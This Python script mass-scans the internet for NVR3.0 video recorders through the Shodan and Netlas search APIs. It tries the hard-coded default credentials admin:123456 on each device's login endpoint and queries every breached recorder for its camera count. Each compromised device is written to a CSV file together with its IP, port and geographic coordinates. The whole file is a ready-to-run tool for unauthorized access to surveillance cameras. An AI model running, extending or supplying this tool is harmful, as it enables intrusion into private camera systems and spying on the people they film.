from shodan import Shodan
import netlas
import config
import requests
import threading
import math
from colors import Colors
import os

request_count = 0
mutex_list = {}

counter_mutex = {}
counter = {
    "success": 0,
    "failed": 0,
    "errors": 0,
    "threads": 0,
}

with open('output.csv', 'w') as f:
    f.writelines("ip,port,camera count,source,city,country,country_code,longitude,latitude\n")


def add_mutex(name):
    if name not in mutex_list:
        mutex_list[name] = threading.Lock()

    def decorator(function):
        def wrapper(*args, **kwargs):
            with mutex_list[name]:
                return function(*args, **kwargs)
        return wrapper
    return decorator


def change_value(value, change=1):
    if value not in counter_mutex:
        counter_mutex[value] = threading.Lock()

    @add_mutex(value)
    def wrapper(value, change):
        counter[value] += change

    wrapper(value, change)


@add_mutex("print_single")
def print_single(server, color="\033[91m"):
    print(f"[ {Colors.green}{counter['success']} {Colors.white}| "
          f"{Colors.orange}{counter['failed']} {Colors.white}| "
          f"{Colors.red}{counter['errors']} {Colors.white}] "
          f"http://{color}{server}{Colors.white}")


@add_mutex("save")
def save(server, count, source, city, country, country_code, long, lat):
    ip, port = server.split(":")
    with open('output.csv', 'a') as f:
        f.writelines(f"{ip},{port},{count},{source},{city.replace(',', ' ')},"
                     f"{country.replace(',', ' ')},{country_code},{long},{lat}\n")


def send_login_request(server, source, city, country, country_code, long, lat):
    try:
        r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json",
                         headers={"Authorization": "Basic YWRtaW46MTIzNDU2"}, timeout=10)
        if r.status_code == 200:
            count = "N/A"
            try:
                r2 = requests.get(f"http://{server}/Media/Device/getDevice?response_format=json",
                                  headers={"Authorization": "Basic YWRtaW46MTIzNDU2"}, timeout=10)
                if r2.status_code == 200:
                    count = len(r2.json()["DeviceConfig"]["Devices"]["Device"])
            except:
                pass
            save(server, count, source, city, country, country_code, long, lat)
            print_single(server, color="\033[92m")
            change_value("success")
        else:
            change_value("failed")
            print_single(server, color="\033[33m")
    except Exception:
        change_value("errors")
        print_single(server)
    finally:
        change_value("threads", -1)


def start_thread(*args):
    while counter['threads'] >= config.MAX_THREADS:
        pass
    change_value("threads")
    threading.Thread(target=send_login_request, args=args).start()


print(f"{Colors.green}success\t{Colors.orange}failure\t{Colors.red}error{Colors.white}")

# SHODAN
if config.SHODAN:
    api = Shodan(config.SHODAN_API)
    search_term = 'http.html:NVR3.0'

    # Si config.SHODAN_COUNTRY est défini, filtre par pays
    if hasattr(config, "SHODAN_COUNTRY") and config.SHODAN_COUNTRY:
        search_term += f" country:{config.SHODAN_COUNTRY}"

    count = api.count(search_term)['total']
    for page in range(math.ceil(count / 100)):
        query = api.search(query=search_term, page=page + 1)
        for server in query['matches']:
            param = f"{server['ip_str']}:{server['port']}"
            location = server.get("location", {})
            start_thread(
                param, "SHODAN",
                location.get("city", "N/A"),
                location.get("country_name", "N/A"),
                location.get("country_code", "N/A"),
                location.get("longitude", 0),
                location.get("latitude", 0)
            )

# NETLAS
if config.NETLAS:
    netlas_connection = netlas.Netlas(api_key=config.NETLAS_API)
    count = netlas_connection.count("http.body:NVR3.0")["count"]
    for page in range(math.ceil(count / 20)):
        query_res = netlas_connection.query(query="http.body:NVR3.0", page=page)
        for server in query_res["items"]:
            geo = server["data"].get("geo")
            if not geo:
                continue
            city = geo.get("city", "N/A")
            start_thread(
                f"{server['data']['ip']}:{server['data']['port']}",
                "NETLAS",
                city,
                geo.get("country", "N/A"),
                geo.get("country", "N/A"),
                geo.get("location", {}).get("long", 0),
                geo.get("location", {}).get("lat", 0)
            )
